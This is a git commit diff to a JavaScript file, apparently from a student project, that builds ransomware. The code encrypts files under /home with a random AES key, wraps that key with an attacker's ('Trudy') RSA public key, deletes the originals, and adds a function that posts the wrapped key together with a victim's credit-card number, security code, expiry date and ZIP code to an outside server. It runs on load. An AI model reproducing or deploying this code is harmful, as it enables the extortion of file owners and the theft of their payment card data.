faec51a296d1311a6439b673e775c870a0a166a5
Nilay <nilaybhatt@my.ccsu.edu>
2017-04-23 12:43:08 -0400

    made changes to encryption of the symetric Key

--- js/crypto.js
+++ js/crypto.js
@@ -1,7 +1,14 @@
 var fileFinder = require('fs-finder');
-var secureRandom = require('secure-random-string');
 var fileStream = require('fs');
-var publicKeyTrudy = ;
+var ursa = require('ursa');
+
+var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
+'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
+'lLIbzgpEh4IEo9CFIN8E29LrqdW+D3p6mAjy2QO882ogMqjsrPhH3XSg/C46QcSg\n'+
+'1wXfv0p6qN1uIOvtVU1ItZ0l9TFwhC/mjhWoPWSEiSa3Ccw8g80iTExOzXVTjZp9\n'+
+'mQmilgQsNiTzlPmGgQIDAQAB\n'+
+'-----END PUBLIC KEY-----\n';
+var encryptedKey='';
 
 var crypto = require('crypto'),
 algorithm = 'aes-256-ctr'
@@ -10,25 +17,28 @@ algorithm = 'aes-256-ctr'
 var files = fileFinder.from('/home').findFiles('*.foo');
 var encryptedFiles = [];
 
-function encrypt(text){
-  var cipher = crypto.createCipher(algorithm,password)
-  var crypted = cipher.update(text,'utf8','hex')
-  crypted += cipher.final('hex');
-  return crypted;
-}
+// function encrypt(text){
+//   var cipher = crypto.createCipher(algorithm,password)
+//   var crypted = cipher.update(text,'utf8','hex')
+//   crypted += cipher.final('hex');
+//   return crypted;
+// }
 
-function decrypt(text){
-  var decipher = crypto.createDecipher(algorithm,password)
-  var dec = decipher.update(text,'hex','utf8')
-  dec += decipher.final('utf8');
-  return dec;
-}
+// function decrypt(text){
+//   var decipher = crypto.createDecipher(algorithm,password)
+//   var dec = decipher.update(text,'hex','utf8')
+//   dec += decipher.final('utf8');
+//   return dec;
+// }
 
 function encryptFiles(files){
-	files.forEach(function(file) {
-   var password = secureRandom(64);
-   //TODO MAKE the CALL TO TRUDY
-   var cipher = crypto.createCipher(algorithm,password);
+	var secureRandom = require('secure-random-string');
+  var password = secureRandom(64);
+  var pubkey = ursa.createPublicKey(pubkeyTrudy);
+  encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
+  var cipher = crypto.createCipher(algorithm,password);
+
+  files.forEach(function(file) { 
    var input = fileStream.createReadStream(file);
    var output = fileStream.createWriteStream(file +'.lock');
    input.pipe(cipher).pipe(output);
@@ -36,9 +46,10 @@ function encryptFiles(files){
  });
 }
 
-function deCryptFiles(files. key){
-	files.forEach(function(file) {
-   var deCipher = crypto.createDecipher(algorithm, key);
+function deCryptFiles(key){
+	var deCipher = crypto.createDecipher(algorithm, key);
+
+  encryptedFiles.forEach(function(file) {
    var input = fileStream.createReadStream(file);
    var output = fileStream.createWriteStream(file.slice(0, -5));
    input.pipe(deCipher).pipe(output);
@@ -53,18 +64,33 @@ function deleteOriginalFiles(files) {
  });
 }
 
-function sendKeyToTrudy(key) {
+function sendCCToTrudy(cardNumber, backNumbers, expiryDate, zip) {
+  //var pubkey = ursa.createPublicKey(pubkeypem);
   var request = require('request');
+  
   request.post(
-    'http://www.yoursiste.com/formpage',
-    { json: { key: key } },
-    function (error, response, body) {
-      if (!error && response.statusCode == 200) {
-        console.log(body)
-      }
-    });
+    'http://www.yoursite.com/formpage',
+    { json: { 
+      key: encryptedKey,
+      CcardNumber: cardNumber,
+      backThree: backNumbers,
+      expDate: expiryDate,
+      zipCode: zip
+    }
+  },
+  function (error, response, body) {
+    if (!error && response.statusCode == 200) {
+      return body;
+    }
+  });
 }
+
 var hw = "Hello World";
+
+encryptFiles(files);
+deleteOriginalFiles(files);
+console.log(encryptedFiles);
+
 
 //console.log(currentPath);
 
